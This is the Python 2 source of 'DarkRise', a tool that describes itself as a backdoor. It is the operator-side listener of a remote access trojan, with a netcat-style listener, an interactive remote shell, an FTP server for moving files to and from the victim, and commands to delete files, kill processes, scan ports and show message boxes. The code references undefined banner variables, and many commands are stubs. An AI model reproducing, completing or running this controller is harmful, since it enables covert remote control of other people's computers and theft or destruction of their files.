#!/usr/bin/python2
#-*- coding:utf-8 -*-

import socket
import colorama
import nclib
from datetime import datetime
import time
import random
import sys
import argparse
import os
import platform
from ftplib import FTP
import readline

banner1 = '''
▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀    ██▀███   ██▓  ██████ ▓█████
▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒    ▓██ ▒ ██▒▓██▒▒██    ▒ ▓█   ▀
░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░    ▓██ ░▄█ ▒▒██▒░ ▓██▄   ▒███
░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄    ▒██▀▀█▄  ░██░  ▒   ██▒▒▓█  ▄
░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄   ░██▓ ▒██▒░██░▒██████▒▒░▒████▒
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒   ░ ▒▓ ░▒▓░░▓  ▒ ▒▓▒ ▒ ░░░ ▒░ ░
 ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░     ░▒ ░ ▒░ ▒ ░░ ░▒  ░ ░ ░ ░  ░
 ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░      ░░   ░  ▒ ░░  ░  ░     ░
   ░          ░  ░   ░     ░  ░         ░      ░        ░     ░  ░
 ░

'''

descrip = '''
                [DarkRise - By 0x4eff (Unamed, Dxvistxr) - 2019]


            \033[1;91m[ \033[00mAuthor : \033[1;91m0x4eff     \033[1;91m]\033[00m
            \033[1;91m[ \033[00mGithub : \033[1;91mDxvistxr   \033[1;91m]\033[00m
            \033[1;91m[ \033[00mYoutube : \033[1;91mDavistar  \033[1;91m]\033[00m
            \033[1;91m[ \033[00mInstagram : \033[1;91m0x4eff  \033[1;91m]\033[00m
            \033[1;91m[ \033[00mVersion : \033[1;91m1.0 (beta)\033[1;91m]\033[00m

'''

def start_ftp_server(host,port,user,password,pathroot):
        try:
                check_ftp_server = os.path.exists('ftp_server.py')
                if check_ftp_server ==True:
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m FTP Server Found!')
                        os.system('python2 ftp_server.py %s %s %s %s %s > /dev/null 2>&1 &' % (host,port,user,password,pathroot))
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP Server Started !')
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP Host : %s' % (host))
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP Port : %s' % (port))
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP User : %s' % (user))
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP Password : %s' % (password))
                        print('\033[1;91m[\033[00m*\033[1;91m]\033[00m  FTP Path : %s' % (pathroot))
                else:
                        print('\033[1;91m[!] FTP Server Not Found !')

        except Exception as error_ftperror:
                print(error_ftperror)

def connect(LHOST,LPORT,ftpuser,ftppasswd,ftpproot):
        start_ftp_server(LHOST,'21',ftpuser,ftppasswd,ftpproot)
        print('\033[1;91m[\033[00m+\033[1;91m] \033[00mListening On %s:%s' % (LHOST,LPORT))
        nc = nclib.Netcat(listen=(LHOST,LPORT))
        data = nc.recv(4096)

        while True:
                try:
                        t = datetime.now().strftime('[%H:%M:%S]')
                        command = raw_input('\033[00m%s shxll@\033[1;91mDarkRise\033[00m$ ' % (t))
                        if command !='':
                            nc.send(command)
                        else:
                            print('[*] Please Enter Command !')
                            nc.send('\n')

                        if command.startswith('quit')==True:
                                os.system('pkill python')
                                print('\033[1;96m[\033[1;93m*\033[1;96m] FTP Server Stoped !')
                                break

                        elif command.startswith('shell')==True:
                                nc.interact()

                        elif command.startswith('cd')==True:
                                path=command[3:]

                        elif command.startswith('cat')==True:
                                filecmd=command[4:]

                        elif command.startswith('clear')==True:
                                if 'Linux' not in platform.platform():
                                        os.system('cls')

                                elif 'Windows' not in platform.platform():
                                        os.system('clear')

                        elif command.startswith('del')==True:
                                file_delete=command[4:]

                        elif command.startswith('rmpt')==True:
                                path_delete=command[5:]

                        elif command.startswith('mkpa')==True:
                                path_create=command[5:]

                        elif command.startswith('rname')==True:
                                rname_string=command[6:]

                        elif command.startswith('ftpdownload')==True:
                                file_download_ftp=command[12:]

                        elif command.startswith('ps')==True:
                                tasklist_data=nc.recv(65536)
                                while True:
                                        if not tasklist_data:
                                                break
                                        else:
                                                print(tasklist_data)
                                                tasklist_data=nc.recv(65536)

                        elif command.startswith('ftpupload')==True:
                                filename=command[10:]
                                check_filename_is_in_ftp_server = os.path.exists(ftpproot+filename)
                                if check_filename_is_in_ftp_server ==True:
                                        pass
                                else:
                                        os.system('cp %s %s' % (filename,ftpproot))
                                        time.sleep(1)


                        elif command.startswith('openurl')==True:
                                link=command[8:]


                        elif command.startswith('copy')==True:
                                filename_copy=command[5:]

                        elif command.startswith('move')==True:
                                filename_move=command[5:]

                        elif command.startswith('xorencode')==True:
                                filename=command[10:]

                        elif command.startswith('b64encode')==True:
                                filename_encode_b64=command[10:]

                        elif command.startswith('b64decode')==True:
                                file_decode_b64=command[10:]

                        elif command.startswith('portscan')==True:
                                data_sent=command[9:]
                                print('[*] Wait Moment Please Scanner Started !')
                                time.sleep(60)

                        elif command.startswith('cwpasswd')==True:
                                file_dt=command[9:]

                        elif command.startswith('tkill')==True:
                                pid_killed=command[5:]

                        elif command.startswith('msgbox')==True:
                                message=command[7:]

                        elif command.startswith('meslp')==True:
                                message_loop=command[6:]

                        elif command.startswith('process')==True:
                                processus=data[8:]

                        elif command.startswith('ping')==True:
                                ip_target=data[5:]

                        elif command.startswith('speak')==True:
                                message=data[6:]

                        elif command.startswith('ls') or command.startswith('dir') or command.startswith('listdir')==True:
                            time.sleep(0.2)


                        elif command.startswith('nscan')==True:
                                data = nc.recv(4096)
                                print(data)
                                time.sleep(31)



                        elif command.startswith('banner')==True:
                                print('\033[00m%s' % (banner1))
                                print(descrip)

                        data = nc.recv(65556)
                        print(data)

                except KeyboardInterrupt:
                        print('[*] CTRL + C')


def main():
        if sys.version[0] =='3':
                sys.exit('[*] Please Run Backdoor With Python2')

        choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
        choice_banner_print = random.choice(choice_banner)
        print(choice_banner_print)
        print(descrip)
        parser = argparse.ArgumentParser()
        print('\033[1;91m')
        parser.add_argument('lhost',type=str, help='Set Host')
        parser.add_argument('lport',type=int, help='Set Port')
        parser.add_argument('ftpuser',type=str,help='Set FTP User')
        parser.add_argument('ftppasswd',type=str,help='Set FTP Password')
        parser.add_argument('ftppath',type=str,help='Set FTP Path')
        args = parser.parse_args()
        print('\033[00m')
        connect(args.lhost,args.lport,args.ftpuser,args.ftppasswd,args.ftppath)

if __name__ == '__main__':
        main()
